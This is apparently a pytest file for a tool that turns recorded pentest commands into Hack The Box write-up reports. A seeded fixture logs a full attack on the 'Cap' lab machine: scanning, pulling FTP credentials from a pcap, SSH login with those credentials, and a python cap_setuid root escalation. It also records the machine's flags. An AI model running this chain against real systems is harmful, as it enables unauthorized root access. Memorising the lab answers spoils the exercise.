from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.command_history import CommandHistory
from app.models.credential import Credential, Flag
from app.models.graph import GraphEdgeDB, GraphNodeDB
from app.models.project import Project
from app.models.report import ReportEvidenceLinkDB, ReportUpdateProposalDB
from app.models.report import ReportUpdateSectionPatchDB
from app.models.terminal_session import TerminalSessionDB
from app.models.timeline import Timeline
from app.models.user import User
from app.services.llm.cli_provider import CLIProvider
from app.services.report_generation_service import ReportGenerationService
from app.services.report_service import ReportService


class _FakeReportingProvider:
    def __init__(self, responses: list[object]):
        self._responses = list(responses)
        self.default_model = "gpt-5.4"

    async def chat_stream(self, messages, model=None, temperature=None, max_tokens=None):
        del messages, model, temperature, max_tokens
        if not self._responses:
            raise AssertionError("No more fake reporting responses configured")
        response = self._responses.pop(0)
        if isinstance(response, Exception):
            raise response
        yield type("Chunk", (), {"content": response, "done": False, "metadata": None})()
        yield type("Chunk", (), {"content": "", "done": True, "metadata": None})()


async def _create_project_with_user(
    test_db: AsyncSession,
    tmp_path: Path,
    *,
    project_id: str = "project-1",
    user_id: str = "user-1",
) -> tuple[Project, User]:
    workspace_path = tmp_path / project_id
    workspace_path.mkdir(parents=True, exist_ok=True)
    project = Project(
        id=project_id,
        name="Cap",
        slug=f"cap-{project_id}",
        type="htb",
        workspace_path=str(workspace_path),
    )
    user = User(
        id=user_id,
        username=f"user-{user_id}",
        email=f"{user_id}@example.com",
        password_hash="hash",
    )
    test_db.add_all([project, user])
    await test_db.commit()
    await test_db.refresh(project)
    await test_db.refresh(user)
    return project, user


async def _create_session(test_db: AsyncSession, project_id: str, session_id: str = "session-1") -> TerminalSessionDB:
    session = TerminalSessionDB(
        id=session_id,
        project_id=project_id,
        name="Recon",
        master_token="master-token",
        viewer_token="viewer-token",
        is_alive=True,
    )
    test_db.add(session)
    await test_db.commit()
    await test_db.refresh(session)
    return session


async def _seed_cap_reporting_evidence(
    test_db: AsyncSession,
    *,
    project_id: str,
    session_id: str,
    user_id: str,
    include_structured_artifacts: bool = True,
) -> dict[str, str]:
    commands = [
        CommandHistory(
            id="cmd-cap-export-ip",
            project_id=project_id,
            session_id=session_id,
            command='export IP=10.129.34.191',
            output="",
            output_preview="10.129.34.191",
            exit_code=0,
            cwd="/tmp",
            duration_ms=5,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-nmap",
            project_id=project_id,
            session_id=session_id,
            command='nmap -Pn -sC -sV "$IP"',
            output=(
                "21/tcp open  ftp     vsftpd 3.0.3\n"
                "22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2\n"
                "80/tcp open  http    Gunicorn\n"
                "|_http-title: Security Dashboard"
            ),
            output_preview="21/tcp open ftp | 22/tcp open ssh | 80/tcp open http",
            exit_code=0,
            cwd="/tmp",
            duration_ms=4280,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-capture-list",
            project_id=project_id,
            session_id=session_id,
            command='curl -s "http://$IP/capture/" | head',
            output='{"captures":[{"id":0,"url":"/data/0"}]}',
            output_preview='/data/0',
            exit_code=0,
            cwd="/tmp",
            duration_ms=180,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-download-pcap",
            project_id=project_id,
            session_id=session_id,
            command='curl -s "http://$IP/download/0" -o 0.pcap',
            output="downloaded 0.pcap",
            output_preview="0.pcap",
            exit_code=0,
            cwd="/tmp",
            duration_ms=220,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-tshark",
            project_id=project_id,
            session_id=session_id,
            command='tshark -r 0.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.command -e ftp.request.arg',
            output="USER nathan\nPASS Buck3tH4TF0RM3!",
            output_preview="USER nathan | PASS Buck3tH4TF0RM3!",
            exit_code=0,
            cwd="/tmp",
            duration_ms=610,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-ssh-id",
            project_id=project_id,
            session_id=session_id,
            command='sshpass -p "$CAPPASS" ssh -o StrictHostKeyChecking=no nathan@"$IP" id',
            output="uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)",
            output_preview="uid=1001(nathan)",
            exit_code=0,
            cwd="/tmp",
            duration_ms=930,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-user-flag",
            project_id=project_id,
            session_id=session_id,
            command='sshpass -p "$CAPPASS" ssh -o StrictHostKeyChecking=no nathan@"$IP" cat /home/nathan/user.txt',
            output="b2caf1abb00bdcb51aca6a6eda2d12e8",
            output_preview="b2caf1abb00bdcb51aca6a6eda2d12e8",
            exit_code=0,
            cwd="/tmp",
            duration_ms=960,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-getcap",
            project_id=project_id,
            session_id=session_id,
            command='sshpass -p "$CAPPASS" ssh -o StrictHostKeyChecking=no nathan@"$IP" getcap /usr/bin/python3.8',
            output="/usr/bin/python3.8 cap_setuid=ep",
            output_preview="python3.8 cap_setuid=ep",
            exit_code=0,
            cwd="/tmp",
            duration_ms=510,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-root-shell",
            project_id=project_id,
            session_id=session_id,
            command=(
                'sshpass -p "$CAPPASS" ssh -o StrictHostKeyChecking=no nathan@"$IP" '
                "\"python3.8 -c 'import os; os.setuid(0); os.system(\\\"id\\\")'\""
            ),
            output="uid=0(root) gid=1001(nathan) groups=1001(nathan)",
            output_preview="uid=0(root)",
            exit_code=0,
            cwd="/tmp",
            duration_ms=730,
            executed_by=user_id,
        ),
        CommandHistory(
            id="cmd-cap-root-flag",
            project_id=project_id,
            session_id=session_id,
            command='sshpass -p "$CAPPASS" ssh -o StrictHostKeyChecking=no nathan@"$IP" python3.8 -c \'import os; os.setuid(0); os.system("cat /root/root.txt")\'',
            output="391aad4e9ee903704a5c0208a52afdd7",
            output_preview="391aad4e9ee903704a5c0208a52afdd7",
            exit_code=0,
            cwd="/tmp",
            duration_ms=840,
            executed_by=user_id,
        ),
    ]
    credential = Credential(
        id="cred-cap-nathan",
        project_id=project_id,
        username="nathan",
        password="Buck3tH4TF0RM3!",
        service="ftp",
    )
    flags = [
        Flag(
            id="flag-cap-user",
            project_id=project_id,
            type="user",
            value="b2caf1abb00bdcb51aca6a6eda2d12e8",
        ),
        Flag(
            id="flag-cap-root",
            project_id=project_id,
            type="root",
            value="391aad4e9ee903704a5c0208a52afdd7",
        ),
    ]
    graph_nodes = [
        GraphNodeDB(id="node-cap-host", project_id=project_id, type="host", label="10.129.34.191"),
        GraphNodeDB(id="node-cap-ftp", project_id=project_id, type="service", label="ftp :21"),
        GraphNodeDB(id="node-cap-ssh", project_id=project_id, type="service", label="ssh :22"),
        GraphNodeDB(id="node-cap-http", project_id=project_id, type="service", label="http :80"),
        GraphNodeDB(id="node-cap-cred", project_id=project_id, type="credential", label="Credential: nathan"),
        GraphNodeDB(
            id="node-cap-session",
            project_id=project_id,
            type="session",
            label="SSH session: nathan@10.129.34.191",
        ),
        GraphNodeDB(
            id="node-cap-privesc",
            project_id=project_id,
            type="finding",
            label="python3.8 cap_setuid",
        ),
        GraphNodeDB(id="node-cap-user-loot", project_id=project_id, type="loot", label="user.txt"),
        GraphNodeDB(id="node-cap-root-loot", project_id=project_id, type="loot", label="root.txt"),
    ]

    items: list[object] = [*commands, *graph_nodes]
    if include_structured_artifacts:
        items.extend([credential, *flags])
    test_db.add_all(items)
    await test_db.commit()

    return {
        "credential_id": credential.id,
        "user_flag_id": flags[0].id,
        "root_flag_id": flags[1].id,
    }


@pytest.mark.anyio
async def test_build_delta_evidence_pack_only_returns_new_items(
    test_db: AsyncSession,
    tmp_path: Path,
):
    project, user = await _create_project_with_user(test_db, tmp_path, project_id="project-delta")
    session = await _create_session(test_db, project.id, session_id="session-delta")
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    cutoff = datetime.now(UTC) - timedelta(minutes=5)
    report.last_accepted_at = cutoff
    await test_db.commit()

    old_time = cutoff - timedelta(minutes=1)
    new_time = cutoff + timedelta(minutes=1)

    old_command = CommandHistory(
        id="cmd-old",
        project_id=project.id,
        session_id=session.id,
        command="whoami",
        output="nobody",
        output_preview="nobody",
        exit_code=0,
        cwd="/tmp",
        duration_ms=10,
        executed_by=user.id,
        created_at=old_time,
    )
    new_command = CommandHistory(
        id="cmd-new",
        project_id=project.id,
        session_id=session.id,
        command="nmap -sV 10.10.10.10",
        output="80/tcp open http",
        output_preview="80/tcp open http",
        exit_code=0,
        cwd="/tmp",
        duration_ms=50,
        executed_by=user.id,
        created_at=new_time,
    )
    old_note = Timeline(
        id="timeline-old",
        project_id=project.id,
        type="note",
        content="old note",
        created_at=old_time,
    )
    new_finding = Timeline(
        id="timeline-new-finding",
        project_id=project.id,
        type="finding",
        content="nginx exposed",
        created_at=new_time,
    )
    old_credential = Credential(
        id="cred-old",
        project_id=project.id,
        username="old",
        password="oldpass",
        created_at=old_time,
    )
    new_flag = Flag(
        id="flag-new",
        project_id=project.id,
        type="user",
        value="flag{user}",
        created_at=new_time,
    )
    old_node = GraphNodeDB(
        id="node-old",
        project_id=project.id,
        type="host",
        label="10.10.10.9",
        created_at=old_time,
    )
    new_node = GraphNodeDB(
        id="node-new",
        project_id=project.id,
        type="service",
        label="http :80",
        created_at=new_time,
    )
    new_edge = GraphEdgeDB(
        id="edge-new",
        project_id=project.id,
        source_id="node-old",
        target_id="node-new",
        kind="runs_on",
        created_at=new_time,
    )
    test_db.add_all(
        [
            old_command,
            new_command,
            old_note,
            new_finding,
            old_credential,
            new_flag,
            old_node,
            new_node,
            new_edge,
        ]
    )
    await test_db.commit()

    service = ReportGenerationService(test_db)
    delta = await service.build_delta_evidence_pack(project.id, report.id)

    assert [item["id"] for item in delta["commands"]] == ["cmd-new"]
    assert [item["id"] for item in delta["timeline"]] == ["timeline-new-finding"]
    assert [item["id"] for item in delta["findings"]] == ["timeline-new-finding"]
    assert delta["credentials"] == []
    assert [item["id"] for item in delta["flags"]] == ["flag-new"]
    assert [item["id"] for item in delta["graph_nodes"]] == ["node-new"]
    assert [item["id"] for item in delta["graph_edges"]] == ["edge-new"]


@pytest.mark.anyio
async def test_build_delta_evidence_pack_truncates_verbose_command_output_for_reporting(
    test_db: AsyncSession,
    tmp_path: Path,
):
    project, user = await _create_project_with_user(test_db, tmp_path, project_id="project-truncate")
    session = await _create_session(test_db, project.id, session_id="session-truncate")
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    verbose_output = "\n".join(f"line-{index:02d}" for index in range(1, 40))
    command = CommandHistory(
        id="cmd-truncate",
        project_id=project.id,
        session_id=session.id,
        command="curl -s http://target/download/0",
        output=verbose_output,
        output_preview="line-01 line-02 line-03",
        exit_code=0,
        cwd="/tmp",
        duration_ms=12,
        executed_by=user.id,
    )
    test_db.add(command)
    await test_db.commit()

    service = ReportGenerationService(test_db)
    delta = await service.build_delta_evidence_pack(project.id, report.id)

    assert delta["commands"][0]["id"] == command.id
    assert delta["commands"][0]["output"] != verbose_output
    assert "line-39" not in delta["commands"][0]["output"]
    assert "line-01" in delta["commands"][0]["output"]


@pytest.mark.anyio
async def test_build_delta_evidence_pack_preserves_last_line_when_verbose_output_is_truncated(
    test_db: AsyncSession,
    tmp_path: Path,
):
    project, user = await _create_project_with_user(test_db, tmp_path, project_id="project-tail-preserve")
    session = await _create_session(test_db, project.id, session_id="session-tail-preserve")
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    verbose_prefix = "\n".join(f"banner-{index:02d}" for index in range(1, 15))
    full_flag = "391aad4e9ee903704a5c0208a52afdd7"
    command = CommandHistory(
        id="cmd-tail-preserve",
        project_id=project.id,
        session_id=session.id,
        command="expect -c '... cat /root/root.txt'",
        output=f"{verbose_prefix}\n{full_flag}",
        output_preview="banner-01 banner-02",
        exit_code=0,
        cwd="/tmp",
        duration_ms=18,
        executed_by=user.id,
    )
    test_db.add(command)
    await test_db.commit()

    service = ReportGenerationService(test_db)
    delta = await service.build_delta_evidence_pack(project.id, report.id)

    assert delta["commands"][0]["id"] == command.id
    assert full_flag in delta["commands"][0]["output"]
    assert f"{full_flag}..." not in delta["commands"][0]["output"]


@pytest.mark.anyio
async def test_generate_update_proposal_returns_none_when_ai_says_no_update(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(test_db, tmp_path, project_id="project-noop")
    session = await _create_session(test_db, project.id, session_id="session-noop")
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    command = CommandHistory(
        id="cmd-noop",
        project_id=project.id,
        session_id=session.id,
        command="nmap -sV 10.10.10.10",
        output="80/tcp open http",
        output_preview="80/tcp open http",
        exit_code=0,
        cwd="/tmp",
        duration_ms=50,
        executed_by=user.id,
    )
    test_db.add(command)
    await test_db.commit()

    async def fake_call(*args, **kwargs):
        return {"decision": "no_update", "summary": "No material progress yet"}

    monkeypatch.setattr(ReportGenerationService, "_call_reporting_json", fake_call)

    service = ReportGenerationService(test_db)
    proposal = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="event",
    )

    proposals = (
        await test_db.execute(
            select(ReportUpdateProposalDB).where(ReportUpdateProposalDB.report_id == report.id)
        )
    ).scalars().all()

    assert proposal is None
    assert proposals == []


@pytest.mark.anyio
async def test_generate_update_proposal_creates_section_patch_and_evidence_links(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(test_db, tmp_path, project_id="project-update")
    session = await _create_session(test_db, project.id, session_id="session-update")
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    command = CommandHistory(
        id="cmd-update",
        project_id=project.id,
        session_id=session.id,
        command="nmap -sV 10.10.10.10",
        output="80/tcp open http",
        output_preview="80/tcp open http",
        exit_code=0,
        cwd="/tmp",
        duration_ms=50,
        executed_by=user.id,
    )
    node = GraphNodeDB(
        id="node-update",
        project_id=project.id,
        type="service",
        label="http :80",
    )
    test_db.add_all([command, node])
    await test_db.commit()

    responses = iter(
        [
            {
                "decision": "update",
                "summary": "Recon advanced enough to update",
                "sections": ["recon"],
            },
            {
                "summary": "Add recon evidence",
                "sections": [
                    {
                        "section_key": "recon",
                        "content_md": "Discovered an exposed HTTP service on port 80.",
                        "summary": "Document exposed HTTP service",
                        "evidence": [
                            {"source_type": "command_history", "source_id": command.id},
                            {"source_type": "graph_node", "source_id": node.id},
                        ],
                    }
                ],
            },
        ]
    )

    async def fake_call(*args, **kwargs):
        return next(responses)

    monkeypatch.setattr(ReportGenerationService, "_call_reporting_json", fake_call)

    service = ReportGenerationService(test_db)
    proposal = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="event",
    )

    stored = await test_db.get(ReportUpdateProposalDB, proposal.id)
    patches = (
        await test_db.execute(
            select(ReportUpdateSectionPatchDB).where(
                ReportUpdateSectionPatchDB.proposal_id == proposal.id
            )
        )
    ).scalars().all()
    evidence_links = (
        await test_db.execute(
            select(ReportEvidenceLinkDB).where(ReportEvidenceLinkDB.proposal_id == proposal.id)
        )
    ).scalars().all()

    assert proposal is not None
    assert stored is not None
    assert stored.status == "pending"
    assert stored.trigger_type == "event"
    assert stored.summary == "Add recon evidence"
    assert len(patches) == 1
    assert patches[0].section_key == "recon"
    assert patches[0].content_md == "Discovered an exposed HTTP service on port 80."
    assert {(item.source_type, item.source_id) for item in evidence_links} == {
        ("command_history", command.id),
        ("graph_node", node.id),
    }


@pytest.mark.anyio
async def test_generate_update_proposal_honors_explicit_target_sections(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(
        test_db,
        tmp_path,
        project_id="project-targeted-update",
    )
    session = await _create_session(test_db, project.id, session_id="session-targeted-update")
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    command = CommandHistory(
        id="cmd-targeted-update",
        project_id=project.id,
        session_id=session.id,
        command="getcap -r / 2>/dev/null",
        output="/usr/bin/python3.8 cap_setuid=ep",
        output_preview="/usr/bin/python3.8 cap_setuid=ep",
        exit_code=0,
        cwd="/tmp",
        duration_ms=33,
        executed_by=user.id,
    )
    test_db.add(command)
    await test_db.commit()

    responses = iter(
        [
            {
                "decision": "update",
                "summary": "Privilege escalation advanced enough to update",
                "sections": ["privilege_escalation"],
            },
            {
                "summary": "Add privesc-only evidence",
                "sections": [
                    {
                        "section_key": "recon",
                        "content_md": "Recon section that should be filtered out.",
                        "summary": "Noise",
                        "evidence": [],
                    },
                    {
                        "section_key": "privilege_escalation",
                        "content_md": "Python capabilities enabled a root shell.",
                        "summary": "Document python cap_setuid abuse",
                        "evidence": [
                            {"source_type": "command_history", "source_id": command.id},
                        ],
                    },
                ],
            },
        ]
    )

    async def fake_call(*args, **kwargs):
        del args, kwargs
        return next(responses)

    monkeypatch.setattr(ReportGenerationService, "_call_reporting_json", fake_call)

    service = ReportGenerationService(test_db)
    proposal = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="manual",
        target_section_keys=["privilege_escalation"],
    )

    patches = (
        await test_db.execute(
            select(ReportUpdateSectionPatchDB)
            .where(ReportUpdateSectionPatchDB.proposal_id == proposal.id)
            .order_by(ReportUpdateSectionPatchDB.created_at.asc())
        )
    ).scalars().all()

    assert proposal is not None
    assert [patch.section_key for patch in patches] == ["privilege_escalation"]
    assert patches[0].content_md == "Python capabilities enabled a root shell."


@pytest.mark.anyio
async def test_generate_update_proposal_accepts_rich_judge_section_objects(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(
        test_db,
        tmp_path,
        project_id="project-rich-judge-sections",
    )
    session = await _create_session(
        test_db,
        project.id,
        session_id="session-rich-judge-sections",
    )
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    command = CommandHistory(
        id="cmd-rich-judge-sections",
        project_id=project.id,
        session_id=session.id,
        command="nmap -sV 10.10.10.10",
        output="80/tcp open http",
        output_preview="80/tcp open http",
        exit_code=0,
        cwd="/tmp",
        duration_ms=50,
        executed_by=user.id,
    )
    test_db.add(command)
    await test_db.commit()

    responses = iter(
        [
            {
                "decision": "update",
                "summary": "Recon advanced enough to update",
                "sections": [
                    {
                        "section_key": "recon",
                        "reason": "New HTTP surface worth documenting",
                    }
                ],
            },
            {
                "summary": "Add recon evidence",
                "sections": [
                    {
                        "section_key": "recon",
                        "content_md": "Discovered an exposed HTTP service on port 80.",
                        "summary": "Document exposed HTTP service",
                        "evidence": [
                            {"source_type": "command_history", "source_id": command.id},
                        ],
                    }
                ],
            },
        ]
    )

    async def fake_call(*args, **kwargs):
        del args, kwargs
        return next(responses)

    monkeypatch.setattr(ReportGenerationService, "_call_reporting_json", fake_call)

    service = ReportGenerationService(test_db)
    proposal = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="manual",
    )

    patches = (
        await test_db.execute(
            select(ReportUpdateSectionPatchDB)
            .where(ReportUpdateSectionPatchDB.proposal_id == proposal.id)
            .order_by(ReportUpdateSectionPatchDB.created_at.asc())
        )
    ).scalars().all()

    assert proposal is not None
    assert [patch.section_key for patch in patches] == ["recon"]
    assert patches[0].content_md == "Discovered an exposed HTTP service on port 80."


@pytest.mark.anyio
async def test_generate_update_proposal_uses_rich_judge_sections_without_second_writer_call(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(
        test_db,
        tmp_path,
        project_id="project-rich-judge-short-circuit",
    )
    session = await _create_session(
        test_db,
        project.id,
        session_id="session-rich-judge-short-circuit",
    )
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    command = CommandHistory(
        id="cmd-rich-judge-short-circuit",
        project_id=project.id,
        session_id=session.id,
        command="nmap -sV 10.10.10.10",
        output="80/tcp open http",
        output_preview="80/tcp open http",
        exit_code=0,
        cwd="/tmp",
        duration_ms=50,
        executed_by=user.id,
    )
    test_db.add(command)
    await test_db.commit()

    response = {
        "decision": "update",
        "summary": "Recon advanced enough to update",
        "sections": [
            {
                "key": "recon",
                "content_md": "Discovered an exposed HTTP service on port 80.",
                "summary": "Document exposed HTTP service",
                "evidence": [
                    {"source_type": "command_history", "source_id": command.id},
                ],
            }
        ],
    }
    call_count = 0

    async def fake_call(*args, **kwargs):
        nonlocal call_count
        del args, kwargs
        call_count += 1
        return response

    monkeypatch.setattr(ReportGenerationService, "_call_reporting_json", fake_call)

    service = ReportGenerationService(test_db)
    proposal = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="manual",
    )

    patches = (
        await test_db.execute(
            select(ReportUpdateSectionPatchDB)
            .where(ReportUpdateSectionPatchDB.proposal_id == proposal.id)
            .order_by(ReportUpdateSectionPatchDB.created_at.asc())
        )
    ).scalars().all()

    assert proposal is not None
    assert call_count == 1
    assert [patch.section_key for patch in patches] == ["recon"]
    assert patches[0].content_md == "Discovered an exposed HTTP service on port 80."


@pytest.mark.anyio
async def test_call_reporting_json_extracts_fenced_json_and_retries_transient_errors(
    test_db: AsyncSession,
    monkeypatch: pytest.MonkeyPatch,
):
    provider = _FakeReportingProvider(
        [
            RuntimeError("cli timeout"),
            "Here is the update you asked for:\n```json\n{\"decision\":\"update\",\"summary\":\"Add recon\",\"sections\":[\"recon\"]}\n```",
        ]
    )

    async def fake_get_provider_for_context(self, user_id: str, context_type: str, project_id: str | None = None):
        del self, user_id, context_type, project_id
        return provider

    monkeypatch.setattr(
        "app.services.report_generation_service.LLMService.get_provider_for_context",
        fake_get_provider_for_context,
    )

    service = ReportGenerationService(test_db)
    payload = await service._call_reporting_json(
        user_id="user-1",
        project_id="project-1",
        system_prompt="Return JSON",
        user_prompt="delta",
        max_tokens=400,
    )

    assert payload == {
        "decision": "update",
        "summary": "Add recon",
        "sections": ["recon"],
    }


@pytest.mark.anyio
async def test_call_reporting_json_uses_safe_codex_model_and_timeout_floor(
    test_db: AsyncSession,
    monkeypatch: pytest.MonkeyPatch,
):
    provider = CLIProvider(
        cli_command="codex",
        cli_args_template="exec --skip-git-repo-check --json --model {model} {prompt}",
        parse_mode="json",
        supports_streaming=True,
        timeout=30,
        default_model="codex-mini-latest",
        temperature=0.7,
        max_tokens=4096,
        top_p=1.0,
        provider_label="Codex",
    )
    captured: dict[str, object] = {}

    async def fake_chat_stream(messages, model=None, temperature=None, max_tokens=None):
        captured["messages"] = messages
        captured["model"] = model
        captured["temperature"] = temperature
        captured["max_tokens"] = max_tokens
        captured["timeout"] = provider.timeout
        yield type(
            "Chunk",
            (),
            {
                "content": '{"decision":"update","summary":"Add recon","sections":["recon"]}',
                "done": False,
                "metadata": None,
            },
        )()
        yield type("Chunk", (), {"content": "", "done": True, "metadata": None})()

    monkeypatch.setattr(provider, "chat_stream", fake_chat_stream)

    async def fake_get_provider_for_context(self, user_id: str, context_type: str, project_id: str | None = None):
        del self, user_id, context_type, project_id
        return provider

    monkeypatch.setattr(
        "app.services.report_generation_service.LLMService.get_provider_for_context",
        fake_get_provider_for_context,
    )

    service = ReportGenerationService(test_db)
    payload = await service._call_reporting_json(
        user_id="user-1",
        project_id="project-1",
        system_prompt="Return JSON",
        user_prompt='{"delta":"value"}',
        max_tokens=400,
    )

    assert payload == {
        "decision": "update",
        "summary": "Add recon",
        "sections": ["recon"],
    }
    assert captured["model"] == "gpt-5.4"
    assert captured["timeout"] == 240


@pytest.mark.anyio
async def test_generate_update_proposal_reuses_matching_pending_proposal(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(test_db, tmp_path, project_id="project-dedup")
    session = await _create_session(test_db, project.id, session_id="session-dedup")
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "Cap")
    await report_service.seed_default_sections(report.id)

    command = CommandHistory(
        id="cmd-dedup",
        project_id=project.id,
        session_id=session.id,
        command="nmap -sV 10.10.10.10",
        output="80/tcp open http",
        output_preview="80/tcp open http",
        exit_code=0,
        cwd="/tmp",
        duration_ms=50,
        executed_by=user.id,
    )
    test_db.add(command)
    await test_db.commit()

    responses = [
        {
            "decision": "update",
            "summary": "Recon advanced enough to update",
            "sections": ["recon"],
        },
        {
            "summary": "Add recon evidence",
            "sections": [
                {
                    "section_key": "recon",
                    "content_md": "Discovered an exposed HTTP service on port 80.",
                    "summary": "Document exposed HTTP service",
                    "evidence": [
                        {"source_type": "command_history", "source_id": command.id},
                    ],
                }
            ],
        },
        {
            "decision": "update",
            "summary": "Recon advanced enough to update",
            "sections": ["recon"],
        },
        {
            "summary": "Add recon evidence",
            "sections": [
                {
                    "section_key": "recon",
                    "content_md": "Discovered an exposed HTTP service on port 80.",
                    "summary": "Document exposed HTTP service",
                    "evidence": [
                        {"source_type": "command_history", "source_id": command.id},
                    ],
                }
            ],
        },
    ]

    async def fake_call(*args, **kwargs):
        del args, kwargs
        return responses.pop(0)

    monkeypatch.setattr(ReportGenerationService, "_call_reporting_json", fake_call)

    service = ReportGenerationService(test_db)
    first = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="event",
    )
    second = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="signal",
    )

    proposals = (
        await test_db.execute(
            select(ReportUpdateProposalDB)
            .where(ReportUpdateProposalDB.report_id == report.id)
            .order_by(ReportUpdateProposalDB.created_at.asc())
        )
    ).scalars().all()

    assert first is not None
    assert second is not None
    assert second.id == first.id
    assert len(proposals) == 1


@pytest.mark.anyio
async def test_deterministic_reporting_provider_generates_dense_htb_cap_writeup_sections(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(
        test_db,
        tmp_path,
        project_id="project-cap-dense-writeup",
    )
    session = await _create_session(
        test_db,
        project.id,
        session_id="session-cap-dense-writeup",
    )
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "HTB Cap Canonical Flow")
    await report_service.seed_default_sections(report.id)
    await _seed_cap_reporting_evidence(
        test_db,
        project_id=project.id,
        session_id=session.id,
        user_id=user.id,
    )
    monkeypatch.setenv("PWNPILOT_FAKE_REPORTING_PROVIDER", "deterministic")

    service = ReportGenerationService(test_db)
    proposal = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="manual",
    )

    assert proposal is not None

    patches = (
        await test_db.execute(
            select(ReportUpdateSectionPatchDB)
            .where(ReportUpdateSectionPatchDB.proposal_id == proposal.id)
        )
    ).scalars().all()
    patches_by_key = {patch.section_key: patch for patch in patches}

    assert report.profile == "htb_writeup"
    assert set(patches_by_key) >= {
        "overview",
        "attack_path",
        "enumeration",
        "foothold",
        "privilege_escalation",
        "flags_evidence",
        "command_timeline",
    }
    assert "10.129.34.191" in patches_by_key["overview"].content_md
    assert "21" in patches_by_key["overview"].content_md
    assert "22" in patches_by_key["overview"].content_md
    assert "80" in patches_by_key["overview"].content_md
    assert "nathan" in patches_by_key["overview"].content_md.lower()

    enumeration_md = patches_by_key["enumeration"].content_md
    assert 'nmap -Pn -sC -sV "$IP"' in enumeration_md
    assert "http" in enumeration_md.lower()
    assert "ftp" in enumeration_md.lower()
    assert "/data/0" in enumeration_md or "0.pcap" in enumeration_md

    attack_path_md = patches_by_key["attack_path"].content_md
    assert "Credential: nathan" in attack_path_md
    assert "SSH session: nathan@10.129.34.191" in attack_path_md
    assert "python3.8 cap_setuid" in attack_path_md
    assert "root.txt" in attack_path_md
    assert "Read root.txt" not in attack_path_md

    foothold_md = patches_by_key["foothold"].content_md
    assert "nathan" in foothold_md.lower()
    assert "ssh" in foothold_md.lower()
    assert "user.txt" in foothold_md

    privilege_escalation_md = patches_by_key["privilege_escalation"].content_md
    assert "getcap" in privilege_escalation_md
    assert "python3.8" in privilege_escalation_md
    assert "cap_setuid" in privilege_escalation_md
    assert "os.setuid(0)" in privilege_escalation_md
    assert "root.txt" in privilege_escalation_md

    flags_md = patches_by_key["flags_evidence"].content_md
    assert "b2caf1abb00bdcb51aca6a6eda2d12e8" in flags_md
    assert "391aad4e9ee903704a5c0208a52afdd7" in flags_md

    command_timeline_md = patches_by_key["command_timeline"].content_md
    assert 'nmap -Pn -sC -sV "$IP"' in command_timeline_md
    assert "tshark -r 0.pcap" in command_timeline_md
    assert 'ssh -o StrictHostKeyChecking=no nathan@"$IP" id' in command_timeline_md
    assert "getcap /usr/bin/python3.8" in command_timeline_md
    assert "/root/root.txt" in command_timeline_md
    assert "391aad4e9ee903704a5c0208a52afdd7" in command_timeline_md

    await report_service.accept_proposal(
        report_id=report.id,
        proposal_id=proposal.id,
        workspace_path=project.workspace_path,
    )
    rendered = (Path(project.workspace_path) / "report.md").read_text()

    assert "## Overview" in rendered
    assert "## Attack Path" in rendered
    assert "## Enumeration" in rendered
    assert "## Foothold" in rendered
    assert "## Privilege Escalation" in rendered
    assert "## Flags / Evidence" in rendered
    assert "## Command Timeline" in rendered
    assert "nmap -Pn -sC -sV \"$IP\"" in rendered
    assert "nathan" in rendered
    assert "python3.8 cap_setuid" in rendered
